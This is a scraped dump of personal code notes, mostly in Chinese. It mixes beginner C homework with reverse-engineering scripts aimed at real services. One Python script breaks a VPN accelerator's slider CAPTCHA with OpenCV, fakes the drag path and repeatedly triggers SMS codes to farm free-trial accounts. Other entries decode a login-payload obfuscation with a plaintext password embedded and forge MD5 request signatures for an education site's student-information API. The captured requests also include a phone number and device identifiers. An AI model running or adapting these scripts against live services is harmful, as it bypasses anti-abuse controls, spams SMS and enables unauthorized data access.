\u0026#34;PXhw7UT1B0a9kQDKZsjIASmOezxYG4CHo5Jyfg2b8FLpEvRr3WtVnlqMidu6cN\u0026#34;; let mut encodechars = String::new(); for c in input.chars() { let num0 = staticchars.find(c); let code: char = match num0 { Some(index) =\u0026gt; staticchars.chars().cycle().nth(index + 3).unwrap(), None =\u0026gt; c, }; let num1 = rand::thread_rng().gen_range(0..62); let num2 = rand::thread_rng().gen_range(0..62); encodechars.push(staticchars.chars().nth(num1).unwrap()); encodechars.push(code); encodechars.push(staticchars.chars().nth(num2).unwrap()); } encodechars } "},{"id":115,"href":"/docs/code/new/%E4%BD%9C%E4%B8%9A2023.10.10/","title":"作业2023.10.10","section":"ee","content":"\r编程题7\r#\r#include \u0026lt;stdio.h\u0026gt; int main() { int num, a, b, c, d; printf(\u0026#34;请输入一个四位数：\u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;num); if (num \u0026gt;= 1000 \u0026amp;\u0026amp; num \u0026lt;= 9999) { a = num % 10; b = num / 100 % 10; c = num / 10 % 10; d = num / 1000; printf(\u0026#34;个位：%d,十位：%d,百位：%d,千位：%d\u0026#34;, a, c, b, d); } else { printf(\u0026#34;重新输入\u0026#34;); } return 0; } 编程题8\r#\r#include \u0026lt;stdio.h\u0026gt; #define PAI 3.1415926 int main() { int r; printf(\u0026#34;请输入半径:\u0026#34;); scanf(\u0026#34;%d\u0026#34;,\u0026amp;r); printf(\u0026#34;圆的半径=%d, 圆的直径=%d, 圆的周长=%.2f\u0026#34;, r, 2*r, PAI*r*2 ); return 0; } 编程题9\r#\r#include \u0026lt;stdio.h\u0026gt; #define PAI 3.1415926 int main() { int r; printf(\u0026#34;请输入半径:\u0026#34;); scanf(\u0026#34;%d\u0026#34;,\u0026amp;r); printf(\u0026#34;半径=%d, 周长=%.2f, 面积=%.2f\u0026#34;, r, 2* PAI*r, PAI*r*r ); return 0; } 编程题11\r#\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;math.h\u0026gt; int main() { double a=3,b=4,c=6; double p,s; if (a+b\u0026gt;c \u0026amp;\u0026amp; a+c\u0026gt;b \u0026amp;\u0026amp; b+c\u0026gt;a) { p=(a+b+c)/2; s= sqrt (p*(p-a)*(p-b)*(p-c)); printf ( \u0026#34;面积为%lf\\n\u0026#34; , s); } else printf ( \u0026#34;无法构成三角形\\n\u0026#34; ); return 0; } 编程题12\r#\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;math.h\u0026gt; int main() { int a,b; puts(\u0026#34;请输入两个整数\u0026#34;); scanf(\u0026#34;%d,%d\u0026#34;,\u0026amp;a,\u0026amp;b); printf(\u0026#34;和=%d,差=%d,积=%d,商=%.2f,余数=%d\u0026#34;, a+b, a-b, a*b, a/(float)b, a%b ); } 编程题13\r#\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;math.h\u0026gt; #define PAI 3.1415926 //圆面积 #define get_round_area(r) PAI * r * r //圆周长 #define get_round_perimeter(r) 2 * PAI * r //球体表面积 #define get_sphere_Sarea(r) 4 * PAI * r *4 * PAI* r //球体体积 #define get_sphere_volume(r) 4.0 / 3 * PAI * r * r * r //圆柱体积 #define get_cylinder_vloume(r,h) get_round_area(r) * h int main() { float r,h; printf(\u0026#34;请输入圆的半径和圆柱的高\\n\u0026#34;); scanf(\u0026#34;%f,%f\u0026#34;,\u0026amp;r,\u0026amp;h); printf(\u0026#34;半径=%.2f，周长=%.2f，面积=%.2f，圆球表面积=%.2f，圆球体积=%.2f，圆柱体积=%.2f\u0026#34;, r, get_round_perimeter(r), get_round_area(r), get_sphere_Sarea(r), get_sphere_volume(r), get_cylinder_vloume(r,h) ); return 0; } 编程题14\r#\r#include \u0026lt;stdio.h\u0026gt; #define PAI 3.1415926 int main() { int r; puts(\u0026#34;请输入半径\u0026#34;); scanf(\u0026#34;%d\u0026#34;,\u0026amp;r); printf(\u0026#34;直径=%d, 周长=%.2f\u0026#34;,2*r,PAI*r*2); return 0; } 编程题15\r#\r#include \u0026lt;stdio.h\u0026gt; int main() { int a,b; puts(\u0026#34;请输入两个整数\u0026#34;); scanf(\u0026#34;%d,%d\u0026#34;,\u0026amp;a,\u0026amp;b); printf(\u0026#34;a=%d, b=%d\u0026#34;,a,b); return 0; } 编程题16\r#\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;math.h\u0026gt; int main() { int r=8; printf(\u0026#34;面积=%.2f\u0026#34;,M_PI*r*r); return 0; } 编程题17\r#\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;math.h\u0026gt; int main() { int r=5; printf(\u0026#34;周长=%.2f\u0026#34;,M_PI*r*2); return 0; } 编程题18\r#\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;math.h\u0026gt; int main() { int r; puts(\u0026#34;请输入半径\u0026#34;); scanf(\u0026#34;%d\u0026#34;,\u0026amp;r); printf(\u0026#34;周长=%.2f,面积=%.2f\u0026#34;,M_PI*r*2,M_PI*r*r); return 0; } "},{"id":116,"href":"/docs/code/new/%E6%98%9F%E4%BA%91%E5%8A%A0%E9%80%9F%E5%99%A8/","title":"星云加速器","section":"ee","content":"一个加速器，新用户免费送1一个小时，注册有滑块，秒了，其他没啥,都是固定，或者uuid秒了，不用特地改\nimport requests,time,base64 import cv2 import numpy as np def gen(): url=\u0026#39;http://api.xyunjiasu.com/captchas/slider/gen\u0026#39; result=requests.get(url).json() b_img=result[\u0026#39;body\u0026#39;][\u0026#39;captchaResponse\u0026#39;][\u0026#39;captcha\u0026#39;][\u0026#39;backgroundImage\u0026#39;].split(\u0026#39;,\u0026#39;)[1] s_img=result[\u0026#39;body\u0026#39;][\u0026#39;captchaResponse\u0026#39;][\u0026#39;captcha\u0026#39;][\u0026#39;sliderImage\u0026#39;].split(\u0026#39;,\u0026#39;)[1] sid=result[\u0026#39;body\u0026#39;][\u0026#39;captchaResponse\u0026#39;][\u0026#39;id\u0026#39;] with open(\u0026#39;./img/b_img.png\u0026#39;,\u0026#39;wb\u0026#39;) as f: f.write(base64.b64decode(b_img)) with open(\u0026#39;./img/s_img.png\u0026#39;,\u0026#39;wb\u0026#39;) as f: f.write(base64.b64decode(s_img)) return sid def simulate_slider_trajectory(start_pos, end_pos, steps, duration): # 起始和结束坐标 start_x, start_y = start_pos end_x, end_y = end_pos # 总步数和每一步对应的时间间隔 time_interval = duration / steps # 计算每次移动的距离 dx = (end_x - start_x) / steps dy = (end_y - start_y) / steps trajectory = [] for i in range(steps + 1): # 包含起点和终点 x = start_x + i * dx y = start_y + i * dy t = i * time_interval trajectory.append({\u0026#39;x\u0026#39;:round(x), \u0026#39;y\u0026#39;:round(y),\u0026#39;t\u0026#39;: round(t*1000)}) return trajectory def _tran_canny(image): \u0026#34;\u0026#34;\u0026#34;消除噪声\u0026#34;\u0026#34;\u0026#34; image = cv2.GaussianBlur(image, (3, 3), 0) return cv2.Canny(image, 50, 150) def detect_displacement(): \u0026#34;\u0026#34;\u0026#34;detect displacement\u0026#34;\u0026#34;\u0026#34; # # 参数0是灰度模式 # \u0026#34;./img/b_img.png\u0026#34;, \u0026#34;./img/s_img.png\u0026#34; image = cv2.imread(\u0026#34;./img/s_img.png\u0026#34;, 0) template = cv2.imread(\u0026#34;./img/b_img.png\u0026#34;, 0) # 寻找最佳匹配 res = cv2.matchTemplate(_tran_canny(image), _tran_canny(template), cv2.TM_CCOEFF_NORMED) # 最小值，最大值，并得到最小值, 最大值的索引 min_val, max_val, min_loc, max_loc = cv2.minMaxLoc(res) top_left = max_loc[0] # 横坐标 return top_left def login(): pass def verify(sid,x): track =track = simulate_slider_trajectory([0,0], [x,20], 80, 1) url=\u0026#39;http://api.xyunjiasu.com/captchas/slider/check\u0026#39; data={\u0026#34;header\u0026#34;:{\u0026#34;channelCode\u0026#34;:\u0026#34;gw\u0026#34;,\u0026#34;channelName\u0026#34;:\u0026#34;gw\u0026#34;,\u0026#34;proxyNetBarId\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;appId\u0026#34;:3,\u0026#34;versionCode\u0026#34;:1,\u0026#34;versionName\u0026#34;:\u0026#34;1.0.0\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;1.0\u0026#34;,\u0026#34;msgId\u0026#34;:\u0026#34;a9a4ba53-1e31-48ba-8ebc-3108409e1f19\u0026#34;,\u0026#34;token\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;dk\u0026#34;:\u0026#34;ac2d9f0925b03b2fa47b934c8b4bd3b5\u0026#34;,\u0026#34;sendTime\u0026#34;:int(time.time()*1000),\u0026#34;deviceType\u0026#34;:3,\u0026#34;imei\u0026#34;:\u0026#34;865304048714552\u0026#34;,\u0026#34;oaid\u0026#34;:\u0026#34;ff3fcf86-b7ff-e639-e5fe-ffffeda7a281\u0026#34;,\u0026#34;uuid\u0026#34;:\u0026#34;undefined\u0026#34;,\u0026#34;idfa\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;openudid\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;deviceModel\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;systemType\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;isConfirm\u0026#34;:0,\u0026#34;webVersionName\u0026#34;:\u0026#34;0.0.0\u0026#34;,\u0026#34;distinctId\u0026#34;:\u0026#34;\u0026#34;},\u0026#34;body\u0026#34;:{\u0026#34;imageCaptchaTrack\u0026#34;:{\u0026#34;bgImageWidth\u0026#34;:x+110,\u0026#34;bgImageHeight\u0026#34;:205,\u0026#34;sliderImageWidth\u0026#34;:63,\u0026#34;sliderImageHeight\u0026#34;:205,\u0026#34;startSlidingTime\u0026#34;:\u0026#34;2024-02-19T12:19:54.471Z\u0026#34;,\u0026#34;entSlidingTime\u0026#34;:\u0026#34;2024-02-19T12:19:55.395Z\u0026#34;,\u0026#34;trackList\u0026#34;:track,\u0026#34;id\u0026#34;:sid}}} result=requests.post(url,params={\u0026#39;id\u0026#39;:sid},json=data).json() print(result) def sms(sid,phone): url=\u0026#39;http://api.xyunjiasu.com/sendMessage/sendSms\u0026#39; data={\u0026#34;header\u0026#34;:{\u0026#34;channelCode\u0026#34;:\u0026#34;gw\u0026#34;,\u0026#34;channelName\u0026#34;:\u0026#34;gw\u0026#34;,\u0026#34;proxyNetBarId\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;appId\u0026#34;:3,\u0026#34;versionCode\u0026#34;:1,\u0026#34;versionName\u0026#34;:\u0026#34;1.0.0\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;1.0\u0026#34;,\u0026#34;msgId\u0026#34;:\u0026#34;11d82337-ecfb-485f-8c0d-08da1b86d9cc\u0026#34;,\u0026#34;token\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;dk\u0026#34;:\u0026#34;ac2d9f0925b03b2fa47b934c8b4bd3b5\u0026#34;,\u0026#34;sendTime\u0026#34;:int(time.time()*1000),\u0026#34;deviceType\u0026#34;:3,\u0026#34;imei\u0026#34;:\u0026#34;865304048714554\u0026#34;,\u0026#34;oaid\u0026#34;:\u0026#34;ff3fcf86-b7ff-e639-e5fe-ffffeda7a281\u0026#34;,\u0026#34;uuid\u0026#34;:\u0026#34;undefined\u0026#34;,\u0026#34;idfa\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;openudid\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;deviceModel\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;systemType\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;isConfirm\u0026#34;:0,\u0026#34;webVersionName\u0026#34;:\u0026#34;0.0.0\u0026#34;,\u0026#34;distinctId\u0026#34;:\u0026#34;\u0026#34;},\u0026#34;body\u0026#34;:{\u0026#34;account\u0026#34;:phone,\u0026#34;codeType\u0026#34;:1,\u0026#34;sliderCaptchaId\u0026#34;:sid}} result=requests.post(url,json=data).json() print(result) def main(): sid=gen() x=detect_displacement() verify(sid,x) sms(sid,\u0026#34;17628828009\u0026#34;) for i in range(10): main() http://api.xyunjiasu.com/captchas/slider/gen http://api.xyunjiasu.com/captchas/slider/check?id=9e6c216f4ee74b6f8e6a239a38bd507d {\u0026#34;header\u0026#34;:{\u0026#34;channelCode\u0026#34;:\u0026#34;gw\u0026#34;,\u0026#34;channelName\u0026#34;:\u0026#34;gw\u0026#34;,\u0026#34;proxyNetBarId\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;appId\u0026#34;:3,\u0026#34;versionCode\u0026#34;:1,\u0026#34;versionName\u0026#34;:\u0026#34;1.0.0\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;1.0\u0026#34;,\u0026#34;msgId\u0026#34;:\u0026#34;a9a4ba53-1e31-48ba-8ebc-3108409e1f19\u0026#34;,\u0026#34;token\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;dk\u0026#34;:\u0026#34;ac2d9f0925b03b2fa47b934c8b4bd3b5\u0026#34;,\u0026#34;sendTime\u0026#34;:1708345195396,\u0026#34;deviceType\u0026#34;:3,\u0026#34;imei\u0026#34;:\u0026#34;865304048714554\u0026#34;,\u0026#34;oaid\u0026#34;:\u0026#34;ff3fcf86-b7ff-e639-e5fe-ffffeda7a281\u0026#34;,\u0026#34;uuid\u0026#34;:\u0026#34;undefined\u0026#34;,\u0026#34;idfa\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;openudid\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;deviceModel\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;systemType\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;isConfirm\u0026#34;:0,\u0026#34;webVersionName\u0026#34;:\u0026#34;0.0.0\u0026#34;,\u0026#34;distinctId\u0026#34;:\u0026#34;\u0026#34;},\u0026#34;body\u0026#34;:{\u0026#34;imageCaptchaTrack\u0026#34;:{\u0026#34;bgImageWidth\u0026#34;:336,\u0026#34;bgImageHeight\u0026#34;:205,\u0026#34;sliderImageWidth\u0026#34;:63,\u0026#34;sliderImageHeight\u0026#34;:205,\u0026#34;startSlidingTime\u0026#34;:\u0026#34;2024-02-19T12:19:54.471Z\u0026#34;,\u0026#34;entSlidingTime\u0026#34;:\u0026#34;2024-02-19T12:19:55.395Z\u0026#34;,\u0026#34;trackList\u0026#34;:[{\u0026#34;x\u0026#34;:1,\u0026#34;y\u0026#34;:1,\u0026#34;t\u0026#34;:8},{\u0026#34;x\u0026#34;:2,\u0026#34;y\u0026#34;:1,\u0026#34;t\u0026#34;:14},{\u0026#34;x\u0026#34;:3,\u0026#34;y\u0026#34;:1,\u0026#34;t\u0026#34;:21},{\u0026#34;x\u0026#34;:4,\u0026#34;y\u0026#34;:1,\u0026#34;t\u0026#34;:27},{\u0026#34;x\u0026#34;:5,\u0026#34;y\u0026#34;:1,\u0026#34;t\u0026#34;:32},{\u0026#34;x\u0026#34;:7,\u0026#34;y\u0026#34;:1,\u0026#34;t\u0026#34;:38},{\u0026#34;x\u0026#34;:8,\u0026#34;y\u0026#34;:1,\u0026#34;t\u0026#34;:45},{\u0026#34;x\u0026#34;:9,\u0026#34;y\u0026#34;:2,\u0026#34;t\u0026#34;:51},{\u0026#34;x\u0026#34;:12,\u0026#34;y\u0026#34;:2,\u0026#34;t\u0026#34;:57},{\u0026#34;x\u0026#34;:13,\u0026#34;y\u0026#34;:3,\u0026#34;t\u0026#34;:63},{\u0026#34;x\u0026#34;:16,\u0026#34;y\u0026#34;:3,\u0026#34;t\u0026#34;:69},{\u0026#34;x\u0026#34;:19,\u0026#34;y\u0026#34;:3,\u0026#34;t\u0026#34;:75},{\u0026#34;x\u0026#34;:20,\u0026#34;y\u0026#34;:3,\u0026#34;t\u0026#34;:81},{\u0026#34;x\u0026#34;:24,\u0026#34;y\u0026#34;:3,\u0026#34;t\u0026#34;:88},{\u0026#34;x\u0026#34;:27,\u0026#34;y\u0026#34;:4,\u0026#34;t\u0026#34;:93},{\u0026#34;x\u0026#34;:29,\u0026#34;y\u0026#34;:4,\u0026#34;t\u0026#34;:99},{\u0026#34;x\u0026#34;:32,\u0026#34;y\u0026#34;:4,\u0026#34;t\u0026#34;:105},{\u0026#34;x\u0026#34;:35,\u0026#34;y\u0026#34;:4,\u0026#34;t\u0026#34;:112},{\u0026#34;x\u0026#34;:37,\u0026#34;y\u0026#34;:4,\u0026#34;t\u0026#34;:117},{\u0026#34;x\u0026#34;:42,\u0026#34;y\u0026#34;:5,\u0026#34;t\u0026#34;:124},{\u0026#34;x\u0026#34;:47,\u0026#34;y\u0026#34;:5,\u0026#34;t\u0026#34;:130},{\u0026#34;x\u0026#34;:52,\u0026#34;y\u0026#34;:5,\u0026#34;t\u0026#34;:136},{\u0026#34;x\u0026#34;:57,\u0026#34;y\u0026#34;:5,\u0026#34;t\u0026#34;:142},{\u0026#34;x\u0026#34;:63,\u0026#34;y\u0026#34;:5,\u0026#34;t\u0026#34;:148},{\u0026#34;x\u0026#34;:68,\u0026#34;y\u0026#34;:6,\u0026#34;t\u0026#34;:153},{\u0026#34;x\u0026#34;:75,\u0026#34;y\u0026#34;:7,\u0026#34;t\u0026#34;:159},{\u0026#34;x\u0026#34;:80,\u0026#34;y\u0026#34;:7,\u0026#34;t\u0026#34;:166},{\u0026#34;x\u0026#34;:85,\u0026#34;y\u0026#34;:7,\u0026#34;t\u0026#34;:172},{\u0026#34;x\u0026#34;:91,\u0026#34;y\u0026#34;:8,\u0026#34;t\u0026#34;:178},{\u0026#34;x\u0026#34;:98,\u0026#34;y\u0026#34;:8,\u0026#34;t\u0026#34;:185},{\u0026#34;x\u0026#34;:101,\u0026#34;y\u0026#34;:9,\u0026#34;t\u0026#34;:190},{\u0026#34;x\u0026#34;:109,\u0026#34;y\u0026#34;:9,\u0026#34;t\u0026#34;:196},{\u0026#34;x\u0026#34;:116,\u0026#34;y\u0026#34;:9,\u0026#34;t\u0026#34;:202},{\u0026#34;x\u0026#34;:122,\u0026#34;y\u0026#34;:9,\u0026#34;t\u0026#34;:208},{\u0026#34;x\u0026#34;:131,\u0026#34;y\u0026#34;:9,\u0026#34;t\u0026#34;:215},{\u0026#34;x\u0026#34;:135,\u0026#34;y\u0026#34;:10,\u0026#34;t\u0026#34;:220},{\u0026#34;x\u0026#34;:141,\u0026#34;y\u0026#34;:10,\u0026#34;t\u0026#34;:226},{\u0026#34;x\u0026#34;:147,\u0026#34;y\u0026#34;:11,\u0026#34;t\u0026#34;:233},{\u0026#34;x\u0026#34;:151,\u0026#34;y\u0026#34;:11,\u0026#34;t\u0026#34;:239},{\u0026#34;x\u0026#34;:154,\u0026#34;y\u0026#34;:11,\u0026#34;t\u0026#34;:245},{\u0026#34;x\u0026#34;:157,\u0026#34;y\u0026#34;:11,\u0026#34;t\u0026#34;:250},{\u0026#34;x\u0026#34;:160,\u0026#34;y\u0026#34;:11,\u0026#34;t\u0026#34;:257},{\u0026#34;x\u0026#34;:163,\u0026#34;y\u0026#34;:11,\u0026#34;t\u0026#34;:263},{\u0026#34;x\u0026#34;:165,\u0026#34;y\u0026#34;:11,\u0026#34;t\u0026#34;:269},{\u0026#34;x\u0026#34;:169,\u0026#34;y\u0026#34;:11,\u0026#34;t\u0026#34;:276},{\u0026#34;x\u0026#34;:171,\u0026#34;y\u0026#34;:11,\u0026#34;t\u0026#34;:281},{\u0026#34;x\u0026#34;:175,\u0026#34;y\u0026#34;:12,\u0026#34;t\u0026#34;:287},{\u0026#34;x\u0026#34;:179,\u0026#34;y\u0026#34;:12,\u0026#34;t\u0026#34;:293},{\u0026#34;x\u0026#34;:184,\u0026#34;y\u0026#34;:12,\u0026#34;t\u0026#34;:299},{\u0026#34;x\u0026#34;:189,\u0026#34;y\u0026#34;:12,\u0026#34;t\u0026#34;:305},{\u0026#34;x\u0026#34;:194,\u0026#34;y\u0026#34;:12,\u0026#34;t\u0026#34;:311},{\u0026#34;x\u0026#34;:197,\u0026#34;y\u0026#34;:12,\u0026#34;t\u0026#34;:317},{\u0026#34;x\u0026#34;:203,\u0026#34;y\u0026#34;:13,\u0026#34;t\u0026#34;:324},{\u0026#34;x\u0026#34;:206,\u0026#34;y\u0026#34;:13,\u0026#34;t\u0026#34;:329},{\u0026#34;x\u0026#34;:210,\u0026#34;y\u0026#34;:13,\u0026#34;t\u0026#34;:336},{\u0026#34;x\u0026#34;:213,\u0026#34;y\u0026#34;:13,\u0026#34;t\u0026#34;:341},{\u0026#34;x\u0026#34;:215,\u0026#34;y\u0026#34;:13,\u0026#34;t\u0026#34;:347},{\u0026#34;x\u0026#34;:217,\u0026#34;y\u0026#34;:13,\u0026#34;t\u0026#34;:354},{\u0026#34;x\u0026#34;:217,\u0026#34;y\u0026#34;:13,\u0026#34;t\u0026#34;:360},{\u0026#34;x\u0026#34;:218,\u0026#34;y\u0026#34;:13,\u0026#34;t\u0026#34;:366},{\u0026#34;x\u0026#34;:219,\u0026#34;y\u0026#34;:13,\u0026#34;t\u0026#34;:372},{\u0026#34;x\u0026#34;:219,\u0026#34;y\u0026#34;:13,\u0026#34;t\u0026#34;:543},{\u0026#34;x\u0026#34;:220,\u0026#34;y\u0026#34;:13,\u0026#34;t\u0026#34;:548},{\u0026#34;x\u0026#34;:221,\u0026#34;y\u0026#34;:13,\u0026#34;t\u0026#34;:555},{\u0026#34;x\u0026#34;:222,\u0026#34;y\u0026#34;:13,\u0026#34;t\u0026#34;:560},{\u0026#34;x\u0026#34;:223,\u0026#34;y\u0026#34;:14,\u0026#34;t\u0026#34;:566},{\u0026#34;x\u0026#34;:225,\u0026#34;y\u0026#34;:15,\u0026#34;t\u0026#34;:572},{\u0026#34;x\u0026#34;:225,\u0026#34;y\u0026#34;:15,\u0026#34;t\u0026#34;:578},{\u0026#34;x\u0026#34;:227,\u0026#34;y\u0026#34;:15,\u0026#34;t\u0026#34;:584},{\u0026#34;x\u0026#34;:227,\u0026#34;y\u0026#34;:15,\u0026#34;t\u0026#34;:590},{\u0026#34;x\u0026#34;:228,\u0026#34;y\u0026#34;:15,\u0026#34;t\u0026#34;:597},{\u0026#34;x\u0026#34;:229,\u0026#34;y\u0026#34;:15,\u0026#34;t\u0026#34;:608},{\u0026#34;x\u0026#34;:229,\u0026#34;y\u0026#34;:16,\u0026#34;t\u0026#34;:614},{\u0026#34;x\u0026#34;:230,\u0026#34;y\u0026#34;:16,\u0026#34;t\u0026#34;:626},{\u0026#34;x\u0026#34;:231,\u0026#34;y\u0026#34;:16,\u0026#34;t\u0026#34;:651},{\u0026#34;x\u0026#34;:231,\u0026#34;y\u0026#34;:17,\u0026#34;t\u0026#34;:656},{\u0026#34;x\u0026#34;:231,\u0026#34;y\u0026#34;:17,\u0026#34;t\u0026#34;:663},{\u0026#34;x\u0026#34;:232,\u0026#34;y\u0026#34;:17,\u0026#34;t\u0026#34;:669},{\u0026#34;x\u0026#34;:232,\u0026#34;y\u0026#34;:17,\u0026#34;t\u0026#34;:688}],\u0026#34;id\u0026#34;:\u0026#34;9e6c216f4ee74b6f8e6a239a38bd507d\u0026#34;}}} http://api.xyunjiasu.com/sendMessage/sendSms {\u0026#34;header\u0026#34;:{\u0026#34;channelCode\u0026#34;:\u0026#34;gw\u0026#34;,\u0026#34;channelName\u0026#34;:\u0026#34;gw\u0026#34;,\u0026#34;proxyNetBarId\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;appId\u0026#34;:3,\u0026#34;versionCode\u0026#34;:1,\u0026#34;versionName\u0026#34;:\u0026#34;1.0.0\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;1.0\u0026#34;,\u0026#34;msgId\u0026#34;:\u0026#34;11d82337-ecfb-485f-8c0d-08da1b86d9cc\u0026#34;,\u0026#34;token\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;dk\u0026#34;:\u0026#34;ac2d9f0925b03b2fa47b934c8b4bd3b5\u0026#34;,\u0026#34;sendTime\u0026#34;:1708345195496,\u0026#34;deviceType\u0026#34;:3,\u0026#34;imei\u0026#34;:\u0026#34;865304048714554\u0026#34;,\u0026#34;oaid\u0026#34;:\u0026#34;ff3fcf86-b7ff-e639-e5fe-ffffeda7a281\u0026#34;,\u0026#34;uuid\u0026#34;:\u0026#34;undefined\u0026#34;,\u0026#34;idfa\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;openudid\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;deviceModel\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;systemType\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;isConfirm\u0026#34;:0,\u0026#34;webVersionName\u0026#34;:\u0026#34;0.0.0\u0026#34;,\u0026#34;distinctId\u0026#34;:\u0026#34;\u0026#34;},\u0026#34;body\u0026#34;:{\u0026#34;account\u0026#34;:\u0026#34;17628818007\u0026#34;,\u0026#34;codeType\u0026#34;:1,\u0026#34;sliderCaptchaId\u0026#34;:\u0026#34;9e6c216f4ee74b6f8e6a239a38bd507d\u0026#34;}} http://api.xyunjiasu.com/user/login {\u0026#34;header\u0026#34;:{\u0026#34;channelCode\u0026#34;:\u0026#34;gw\u0026#34;,\u0026#34;channelName\u0026#34;:\u0026#34;gw\u0026#34;,\u0026#34;proxyNetBarId\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;appId\u0026#34;:3,\u0026#34;versionCode\u0026#34;:1,\u0026#34;versionName\u0026#34;:\u0026#34;1.0.0\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;1.0\u0026#34;,\u0026#34;msgId\u0026#34;:\u0026#34;4ec87158-0984-4976-a3f7-44819fc02cea\u0026#34;,\u0026#34;token\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;dk\u0026#34;:\u0026#34;ac2d9f0925b03b2fa47b934c8b4bd3b5\u0026#34;,\u0026#34;sendTime\u0026#34;:1708345283287,\u0026#34;deviceType\u0026#34;:3,\u0026#34;imei\u0026#34;:\u0026#34;865304048714554\u0026#34;,\u0026#34;oaid\u0026#34;:\u0026#34;ff3fcf86-b7ff-e639-e5fe-ffffeda7a281\u0026#34;,\u0026#34;uuid\u0026#34;:\u0026#34;undefined\u0026#34;,\u0026#34;idfa\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;openudid\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;deviceModel\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;systemType\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;isConfirm\u0026#34;:0,\u0026#34;webVersionName\u0026#34;:\u0026#34;0.0.0\u0026#34;,\u0026#34;distinctId\u0026#34;:\u0026#34;\u0026#34;},\u0026#34;body\u0026#34;:{\u0026#34;account\u0026#34;:\u0026#34;17628818007\u0026#34;,\u0026#34;yzm\u0026#34;:\u0026#34;3005\u0026#34;,\u0026#34;loginType\u0026#34;:1,\u0026#34;codeType\u0026#34;:1,\u0026#34;autoLogin\u0026#34;:true}} "},{"id":117,"href":"/docs/code/new/%E6%9C%A8%E9%A9%AC%E7%99%BB%E9%99%86/","title":"木马登陆","section":"ee","content":" function enc(e){ var t = f() , n = p(\u0026#34;mmkt\u0026#34; + e, t); return t+n; } function f() { var e = Math.floor(100 * Math.random()) + 125 , t = Math.floor(200 * Math.random()) , n = t + e; return String.fromCharCode(n) + String.fromCharCode(t) } function p(e, t) { var r= t.charCodeAt(0) - t.charCodeAt(1) var s=\u0026#39;\u0026#39;; for(let i=0;i\u0026lt;e.length;i++){ var o=e.charCodeAt(i)+r; s+=String.fromCharCode(o) } return s } function dec(e){ e=e+\u0026#39;\u0026#39; var k=e.slice(0,2) k=k.charCodeAt(0)-k.charCodeAt(1) var s=\u0026#39;\u0026#39; for(let i=2;i\u0026lt;e.length;i++){ var n=e.charCodeAt(i) s+=String.fromCharCode(n-k) } return s } var data=enc(\u0026#39;{\u0026#34;userName\u0026#34;: \u0026#34;17628818007\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;12345678ik\u0026#34;, \u0026#34;countryType\u0026#34;: 86, \u0026#34;equipment\u0026#34;: {\u0026#34;deviceBrand\u0026#34;: \u0026#34;Chrome\u0026#34;, \u0026#34;deviceModel\u0026#34;: \u0026#34;119.0.0.0\u0026#34;, \u0026#34;operationSystem\u0026#34;: \u0026#34;Windows 10\u0026#34;, \u0026#34;operationSystemVersion\u0026#34;: \u0026#34;10.0\u0026#34;, \u0026#34;serviceProvider\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;resolutionHeight\u0026#34;: 960, \u0026#34;resolutionWidth\u0026#34;: 1707}}\u0026#39;) console.log(data) console.log(dec(data)) "},{"id":118,"href":"/docs/code/new/%E6%9F%90update/","title":"某update","section":"ee","content":"import time import requests import hashlib url = \u0026#34;http://zzxx.scedu.net/msc-api/api/tour/stuInfo/list\u0026#34; def sing(data, d): y = \u0026#39;\u0026#39; for k in d: if k == \u0026#39;time\u0026#39; or k == \u0026#34;sing\u0026#34; or isinstance(data[k], list): continue y += str(data[k]) t = str(int(time.time()))+\u0026#39;000\u0026#39; s = time.strftime(\u0026#34;%Y%m%d%H\u0026#34;, time.localtime()) y = y+t+s+\u0026#39;zyp\u0026#39; # print(y) sign = hashlib.md5(y.encode()).hexdigest() data[\u0026#39;sing\u0026#39;] = sign data[\u0026#39;time\u0026#39;] = t return data def l(name): header = { \u0026#34;Accept\u0026#34;: \u0026#34;application/json, text/plain, */*\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;, \u0026#34;Content-Length\u0026#34;: \u0026#34;468\u0026#34;, \u0026#34;Content-Type\u0026#34;: 